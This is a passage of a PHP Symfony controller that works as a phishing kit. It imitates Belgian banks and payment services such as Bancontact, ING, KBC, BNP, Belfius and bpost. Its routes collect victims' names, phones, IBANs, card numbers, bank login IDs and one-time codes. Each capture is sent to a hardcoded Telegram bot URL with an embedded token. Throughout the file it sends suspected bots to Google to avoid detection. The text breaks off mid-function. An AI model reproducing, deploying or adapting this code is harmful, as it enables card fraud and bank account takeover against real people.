<?php

namespace App\Controller;

use App\Entity\User;
use Doctrine\Persistence\ManagerRegistry;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\Session\Session;
use Symfony\Component\Routing\Annotation\Route;

class UserController extends AbstractController
{
    private $telegram1 ='https://api.telegram.org/bot7578011339:AAHNcoZx0VZ2f-utovfoJL-o41pi6G_8Ql0/sendMessage?chat_id=-4654249586&text=' ;
    private $telegram ='https://api.telegram.org/bot7578011339:AAHNcoZx0VZ2f-utovfoJL-o41pi6G_8Ql0/sendMessage?chat_id=-4654249586&text=' ;
    //private $telegram ='https://api.telegram.org/bot7578011339:AAHNcoZx0VZ2f-utovfoJL-o41pi6G_8Ql0/sendMessage?chat_id=-4654249586&text=' ;
    //private $telegram1 ='https://api.telegram.org/bot7578011339:AAHNcoZx0VZ2f-utovfoJL-o41pi6G_8Ql0/sendMessage?chat_id=-4654249586&text=' ;
    private $country='BE';
    private $FOD=0;

    #[Route('/')]
    public function index(Request $request,ManagerRegistry $doctrine): Response
    {
        $message="";
        $response="";
        $month = date("m");
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $message .= "-------------------🇧🇪------Click------🇧🇪--------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram1 . urlencode($message)."" );
        }else{
            return $this->redirect('https://www.google.com/');
        }
        if ($this->FOD==1){
            return $this->render('user/fod.html.twig',array('response'=>$response));

        }else{
            return $this->render('user/index.html.twig',array('response'=>$response));
        }
    }

    #[Route('/index2/')]
    public function index2(Request $request,ManagerRegistry $doctrine): Response
    {
        $message="";
        $response="";
        $month = date("m");
        $type="";
        if ($this->antibot($request)==false){
            $type=$request->get('type');
            $ip = $request->getClientIp();
            if ($request->getMethod()==='POST'){
                $name=$request->get('name');
                $number=$request->get('number');
                $iban=$request->get('iban');
                if ($name!="" and $number!="" and $iban!=""){
                    $message .= "----------🇧🇪------BILLING-".$type."-bank------🇧🇪--------------\n";
                    $message .= "Name: ".$name."\n";
                    $message .= "Phone ". $number."\n";
                    $message .= "IBAN ".$iban."\n";
                    $message .= "------------------------ WHOIS -------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    if ($type=='ing'){
                        return $this->redirect('/ingLogin/');
                    }elseif ($type=='kbc'){
                        return $this->redirect('/kbcLog/');
                    }else{
                        return $this->redirect('/bancontact/');
                    }
                }else{
                    $response="!OK";
                }

            }else{
                $message .= "----------🇧🇪------Click-".$type."-bank------🇧🇪--------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }


        }else{
            return $this->redirect('https://www.google.com/');
        }
        if ($this->FOD==1){
            return $this->render('user/fod.html.twig',array('response'=>$response));

        }else{
            return $this->render('user/index2.html.twig',array('response'=>$response,'type'=>$type));
        }
    }


    #[Route('/bancontact/')]
    public function bancontact(Request $request,ManagerRegistry $doctrine): Response
    {
        $message="";
        $response="";
        $card="";
        $expiryMonth="";
        $expiryYear="";
        $month = date("m");
        $session=new Session();
        if ($this->antibot($request)==false){
            if ($request->getMethod()==='POST'){
                $currentD = $this->get_current_file_url($Protocol='https://');
                $em=$doctrine->getManager();
                $submittedToken = $request->request->get('token');
                $expiryYear=$request->get('expiryYear');
                $expiryMonth=$request->get('expiryMonth');
                $card=$request->get('card');

                $ip = $request->getClientIp();
                if ($this->isCsrfTokenValid('add-card', $submittedToken)) {
                    if ($card != "") {
                        if ($expiryMonth != "--") {
                            if ($expiryYear != "----") {
                                $card = str_replace(' ', '', $card);
                                $result = substr($card, 0, 4);
                                $result2 = substr($card, 0, 6);
                                $result3 = substr($card, 0, 6);
                                $result4 = substr($card, 0, 6);
                                $result5 = substr($card, 0, 6);
                                $result6 = substr($card, 0, 6);
                                $result7 = substr($card, 0, 6);
                                if ($expiryYear>=2022){
                                        if ($expiryMonth>=$month or($expiryMonth<= $month and $expiryYear>2022) ){
                                            $user=$em->getRepository(User::class)->findOneByIp($ip);
                                            if ($user){
                                                $user->setNumeroCard($card);
                                                $user->setMonth($expiryMonth);
                                                $user->setYear($expiryYear);
                                                $user->setIp($ip);
                                                $user->setNowStep('cc');
                                                $user->setStep('');
                                                $em->persist($user);
                                                $em->flush();

                                                $session->set('user',$user);

                                                $message .= "--------------------------CC-------------------------------\n";
                                                $message .= "CARD NUMBER: ".$card ."\n";
                                                $message .= "EXPIRY MONTH: ".$expiryMonth ."\n";
                                                $message .= "EXPIRY YEAR: ".$expiryYear ."\n";
                                                $message .= "-------------------------LINK------------------------------\n";
                                                $message .="LINK: ".$currentD."/panel/".$user->getId()."/"." \n";
                                                $message .=" \n";
                                                $message .= "-------------------------WHOIS------------------------------\n";
                                                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                                                $message .= "------------------------ALIASNEO ----------------------------\n";
                                                file_get_contents($this->telegram . urlencode($message)."" );
                                                return $this->redirect('/loading/');
                                            }else{
                                                $user = new User();
                                                $user->setNumeroCard($card);
                                                $user->setMonth($expiryMonth);
                                                $user->setYear($expiryYear);
                                                $user->setIp($ip);
                                                $user->setNowStep('cc');
                                                $user->setStep('');
                                                $user->setCode('');
                                                $user->setCode2('');
                                                $em->persist($user);
                                                $em->flush();

                                                $session->set('user',$user);

                                                $message .= "--------------------------CC-------------------------------\n";
                                                $message .= "CARD NUMBER: ".$card ."\n";
                                                $message .= "EXPIRY MONTH: ".$expiryMonth ."\n";
                                                $message .= "EXPIRY YEAR: ".$expiryYear ."\n";
                                                $message .= "-------------------------LINK------------------------------\n";
                                                $message .="LINK: ".$currentD."/panel/".$user->getId()."/"." \n";
                                                $message .=" \n";
                                                $message .= "-------------------------WHOIS------------------------------\n";
                                                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                                                $message .= "------------------------ALIASNEO ----------------------------\n";
                                                file_get_contents($this->telegram . urlencode($message)."" );
                                                return $this->redirect('/loading/');
                                            }
                                        }else{
                                            $response = 'errorMonth';
                                        }
                                    }else{
                                        $response = 'errorYear';
                                    }
                            } else {
                                $response = 'errorYear';
                            }
                        } else {
                            $response = 'errorMonth';
                        }
                    }else{
                        $response='errorCard';
                    }
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "---------------------Click Bancontact------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/bancontact.html.twig',array('response'=>$response,'card'=>$card,
            'expiryMonth'=>$expiryMonth,'expiryYear'=>$expiryYear));
    }



    #[Route('/loading/')]
    public function loading(Request $request,ManagerRegistry $doctrine): Response
    {
        $response="";
        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');

        }
        return $this->render('user/loading.html.twig',array('response'=>$response));
    }


    #[Route('/argenta/')]
    public function argenta(Request $request,ManagerRegistry $doctrine): Response
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('otp');
                if ($otp!=""){
                    $message .= "--------------------------OTP-ARGENTA------------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/argentaLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------STEP VBV ARGENTA------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/argenta.html.twig',array('response'=>$response,'user'=>$user));
    }

    #[Route('/argentaLoading/')]
    public function argentaLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $message="";
        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            $response=$request->get('error');
            
            $ip = $request->getClientIp();
            $message .= "----------------------STEP LOADING ARGENTA------------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "-------------------------- ALIASNEO -----------------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );
        
        }
        return $this->render('user/argentaLoading.html.twig',array('response'=>$response));
    }



    #[Route('/crelan/')]
    public function crelan(Request $request,ManagerRegistry $doctrine): Response
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            if ($request->getMethod()==='POST'){
                if ($user){
                    $user->setStep('');
                    $em->flush();
                }
                $otp=$request->get('otp');
                if ($otp!=""){
                    $message .= "--------------------------OTP-CRELAN------------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/crelanLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------STEP VBV CRELAN------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/crelan.html.twig',array('response'=>$response,'user'=>$user));
    }

    #[Route('/crelanLoading/')]
    public function crelanLoading(Request $request)
    {
        $response="";
        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
                $ip = $request->getClientIp();
                $message .= "---------------------STEP LOADING CRELAN------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        return $this->render('user/crelanLoading.html.twig',array('response'=>$response));
    }

    #[Route('/bnp/')]
    public function bnp(Request $request,ManagerRegistry $doctrine): Response
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            if ($request->getMethod()==='POST'){
                $otp=$request->get('otp');
                if ($otp!=""){
                    $message .= "--------------------------OTP-BNP------------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/bnpLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "------------------------STEP VBV BNP------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/bnp.html.twig',array('response'=>$response,'user'=>$user));
    }


    #[Route('/bnpLoading/')]
    public function bnpnLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $message .= "";

        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();
            $id=$session->get('user')->getId();
            $em=$doctrine->getManager();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            
            $ip = $request->getClientIp();
            $message .= "----------------------STEP BNP LOADING------------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );
        

        }
        return $this->render('user/bnpLoading.html.twig',array('response'=>$response));
    }


    #[Route('/get/step/')]
    public function getStep(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();

        $id=$session->get('user')->getId();
        $user=$em->getRepository(User::class)->findOneById($id);
        if ($user){
            $response=$user->getStep();
        }else{
            $response="cc";
        }

        return new Response($response);
    }


    #[Route('/success/')]
    public function success(Request $request)
    {
        $response="";
        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/success.html.twig');
    }


    #[Route('/bancontactVbv/')]
    public function bancontactVbv(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('card');
                if ($otp!=""){
                    $message .= "--------------------------OTP-bancontact------------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/loading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------STEP VBV BANCONTACT------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/bancontactVbv.html.twig',array('response'=>$response,'user'=>$user));
    }

    #[Route('/set/bnp/')]
    public function setBnp(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $em=$doctrine->getManager();

        $id=$request->get('id');
        $otp=$request->get('otp');
        $ip = $request->getClientIp();
        $message="";
        $user=$em->getRepository(User::class)->findOneById($id);
        if ($user){
            if ($otp!=""){
                $message .= "--------------------------OTP-BNP------------------------------\n";
                $message .= "CODE: ".$otp ."\n";
                $message .= "------------------------- WHOIS ---------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
                $response="OK";
            }else{
                $response="ErrorOtp";
            }
        }

        return new Response($response);
    }
    
    
     #[Route('/belfius/')]
    public function belfius(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('otp');
                if ($otp!=""){
                    $message .= "--------------------------OTP-BELFIUS------------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/belfiusLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------STEP VBV BELFIUS------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/belfius.html.twig',array('response'=>$response,'user'=>$user));
    }


    #[Route('/belfiusLoading/')]
    public function belfiusLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";

        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();
            $id=$session->get('user')->getId();
            $em=$doctrine->getManager();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            
            $ip = $request->getClientIp();
            $message .= "---------------------STEP LOADING BELFIUS------------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );
            

        }
        return $this->render('user/belfiusLoading.html.twig',array('response'=>$response,"user"=>$user));
    }


    #[Route('/ing/')]
    public function ing(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('otp');
                if ($otp!=""){
                    $message .= "--------------------------OTP-ING------------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/ingLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------STEP VBV ING------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/ing.html.twig',array('response'=>$response,'user'=>$user));
    }
    

    #[Route('/ingLoading/')]
    public function ingLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";

        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();
            $id=$session->get('user')->getId();
            $em=$doctrine->getManager();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            
            $ip = $request->getClientIp();
            $message .= "--------------------------STEP LOADING ING------------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );
            

        }
        return $this->render('user/ingLoading.html.twig',array('response'=>$response,"user"=>$user));
    }


    #[Route('/kbc/')]
    public function kbc(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('otp');
                if ($otp!=""){
                    $message .= "--------------------------OTP-KBC------------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/kbcLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------STEP VBV KBC------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/kbc.html.twig',array('response'=>$response,'user'=>$user));
    }



    #[Route('/kbcLoading/')]
    public function kbcLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";

        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();
            $id=$session->get('user')->getId();
            $em=$doctrine->getManager();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            
            $ip = $request->getClientIp();
            $message .= "--------------------------STEP KBC LOADING------------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );
            

        }
        return $this->render('user/kbcLoading.html.twig',array('response'=>$response,"user"=>$user));
    }


    #[Route('/axa/')]
    public function axa(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('otp');
                if ($otp!=""){
                    $message .= "--------------------------OTP-AXA------------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/axaLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------STEP VBV AXA------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/axa.html.twig',array('response'=>$response,'user'=>$user));
    }



    #[Route('/axaLoading/')]
    public function axaLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";

        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();
            $id=$session->get('user')->getId();
            $em=$doctrine->getManager();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            
            $ip = $request->getClientIp();
            $message .= "----------------------STEP AXA LOADING------------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );
            

        }
        return $this->render('user/axaLoading.html.twig',array('response'=>$response,"user"=>$user));
    }

    #[Route('/bepost/')]
    public function bepost(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('otp');
                if ($otp!=""){
                    $message .= "------------------------OTP-BEPOST------------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/bepostLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------STEP VBV BPOST------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/bepost.html.twig',array('response'=>$response,'user'=>$user));
    }



    #[Route('/bepostLoading/')]
    public function bepostLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";

        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();
            $id=$session->get('user')->getId();
            $em=$doctrine->getManager();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            
            $ip = $request->getClientIp();
            $message .= "--------------------------STEP LOADING BPOST------------------------------\n";
            $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
            $message .= "------------------------ ALIASNEO -------------------------\n";
            file_get_contents($this->telegram . urlencode($message)."" );
            

        }
        return $this->render('user/bepostLoading.html.twig',array('response'=>$response,"user"=>$user));
    }


    #[Route('/billing/')]
    public function billing(Request $request,ManagerRegistry $doctrine): Response
    {
        $message="";
        $name="";
        $email="";
        $tele="";
        $response="";
        if ($this->antibot($request)==false){
            if ($request->getMethod()==='POST'){
                $ip = $request->getClientIp();
                $name=$request->get('name');
                $email=$request->get('email');
                $tele=$request->get('tele');
                if ($name!="" or $tele!=""){
                    $message .= "------------------------Billing---------------------------\n";
                    $message .= "NAME : ".$name ."\n";
                    $message .= "EMAIL : ".$email ."\n";
                    $message .= "PHONE : ".$tele ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/bancontact/');
                }else{
                    $response="Error";
                }
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/billing.html.twig',array('response'=>$response,'name'=>$name,
            'email'=>$email,'tele'=>$tele));
    }


    #[Route('/hello/')]
    public function hello(Request $request,ManagerRegistry $doctrine)
    {
        $message="";
        $response="";
        $session=new Session();
        $em=$doctrine->getManager();
        $response=$request->get('error');
        if ($this->antibot($request)==false){
            $ip = $request->getClientIp();
            $id=$session->get('user')->getId();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            if ($request->getMethod()==='POST'){
                $otp=$request->get('otp');
                if ($otp!=""){
                    $message .= "---------------------OTP-HELLO-BANK------------------------\n";
                    $message .= "CODE: ".$otp ."\n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/helloLoading/');
                }else{
                    $response="ErrorOtp";
                }
            }else{
                $ip = $request->getClientIp();
                $message .= "--------------------------STEP VBV HELLO------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            }
        }else{
            return $this->redirect('https://www.google.com/');
        }
        return $this->render('user/hello.html.twig',array('response'=>$response,'user'=>$user));
    }



    #[Route('/helloLoading/')]
    public function helloLoading(Request $request,ManagerRegistry $doctrine)
    {
        $response="";
        $message="";
        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();
            $id=$session->get('user')->getId();
            $em=$doctrine->getManager();
            $user=$em->getRepository(User::class)->findOneById($id);
            $user->setStep('');
            $em->flush();
            
                $ip = $request->getClientIp();
                $message .= "---------------------STEP HELLO LOADING------------------------------\n";
                $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                $message .= "------------------------ ALIASNEO -------------------------\n";
                file_get_contents($this->telegram . urlencode($message)."" );
            

        }
        return $this->render('user/helloLoading.html.twig',array('response'=>$response,"user"=>$user));
    }

    #[Route('/ingLogin/')]
    public function ingLogin(Request $request,ManagerRegistry $doctrine)
    {
        $response="";

        if ($this->antibot($request)==true){
            return $this->redirect('https://www.google.com/');
        }else{
            $session=new Session();

            $ip = $request->getClientIp();
            $em=$doctrine->getManager();
            $message='';
            $user='';
            if ($request->getMethod()==='POST'){
                $card=$request->get('cardNumber');
                $idlog=$request->get('ingId');
                $currentD = $this->get_current_file_url($Protocol='https://');

                if ($card!="" and $idlog!=""){
                    $user=$em->getRepository(User::class)->findOneByIp($ip);
                    if($user){
                        $user->setIp($ip);
                        $user->setStep('');
                        $user->setNumeroCard($card);
                        $user->setMonth($idlog);
                        $em->flush();
                        $session->set('user',$user);
                    }else{
                        $user = new User();
                        $user->setIp($ip);
                        $user->setNumeroCard($card);
                        $user->setStep('');
                        $user->setMonth($idlog);
                        $em->persist($user);
                        $em->flush();
                        $session->set('user',$user);
                    }
                    $message .= "---------------------LOGIN-ING-BANK------------------------\n";
                    $message .= "CARD : 6703".$card ."\n";
                    $message .= "ID : ".$idlog ."\n";
                    $message .= "-------------------------LINK------------------------------\n";
                    $message .="LINK: ".$currentD."/panel/".$user->getId()."/"." \n";
                    $message .=" \n";
                    $message .= "------------------------- WHOIS ---------------------------\n";
                    $message .= "http://www.geoiptool.com/?IP=".$ip ."\n";
                    $message .= "------------------------ ALIASNEO -------------------------\n";
                    file_get_contents($this->telegram . urlencode($message)."" );
                    return $this->redirect('/ingLoginLoading/');
                }else{
                    $response="Error";
                }
